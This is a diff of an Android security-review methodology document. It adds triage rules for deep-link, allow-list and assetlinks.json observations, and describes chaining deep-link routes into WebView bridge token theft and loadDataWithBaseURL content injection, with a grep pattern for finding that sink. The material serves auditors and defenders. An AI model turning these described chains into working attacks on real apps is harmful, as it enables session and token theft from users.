 | Observation | Why it is not a finding | What would make it one |
@@ -3218,6 +3587,8 @@ Decision:
 | A deferred deep link from an attribution SDK routes the user | Attribution routing is the SDK's purpose | The SDK-supplied value reaching a privileged route or a WebView URL that the intent path validates and this path does not (D09-035) |
 | `enforceIntentFilter` absent on a pre-Android-16 target | The attribute does not exist below API 36 — its absence there is a platform limitation, not a defect | The app targets 36+ and a sibling app in the same family sets it (D09-053), or a component carries `intentMatchingFlags="none"` inside a hardened application (D09-054) |
 | "A malicious app could register this scheme" with no PoC app built | Assertion, not evidence; and it is precisely the class Starbucks and Grab exclude | The stub app installed, the real flow run, the secret captured, and the secret redeemed |
+| An allow-list or route negative decided on the emulator's flag state | Server-delivered lists and feature flags differ per device class; the emulator's state is not the production user's | The same probe set accepted on a production-channel device, with the per-device table (D09-081) |
+| `assetlinks.json` lists fingerprints that are not the current signer | Lineage ancestors are expected — they keep older installs verifying | A listed fingerprint **outside** the v3 signing lineage that the client cannot account for (D09-019) |
 
 ## Cross-surface joins
 
@@ -3226,7 +3597,12 @@ Decision:
   token-returning `@JavascriptInterface` method is the payload half. Neither is filed alone. Nobody reviews
   the deep-link route table and the bridge method inventory in the same sitting, which is exactly why the
   Grab, Basecamp and TikTok reports exist. File the router primitive first (its id exists), then the bridge
-  finding as the consumer, then backfill (D09-080).
+  finding as the consumer, then backfill (D09-080). The sibling shape is **content injection, not navigation**:
+  a deep-link parameter or exported-activity extra concatenated into the `data` argument of
+  `loadDataWithBaseURL(<trusted https base>, data, …)`. The attacker's markup then runs *as the trusted origin*
+  (cookies, bridge, fetch) without any URL validator ever seeing a host. Grep `loadDataWithBaseURL\(` with
+  `-B12` for `getStringExtra|getQueryParameter` (D09-059's How already does) and file it under D10-073, the
+  trusted-base template item, rather than under D09-059.
 - **D09 × D02/D03 (signing and manifest) — the fingerprint join.** The signer SHA-256 you capture once in
   D02 is the input to three unrelated checks: the `assetlinks.json` comparison here (D09-015), the
   `protectionLevel="signature"` analysis in D03/D06, and the API-key restriction check in D18. The specific
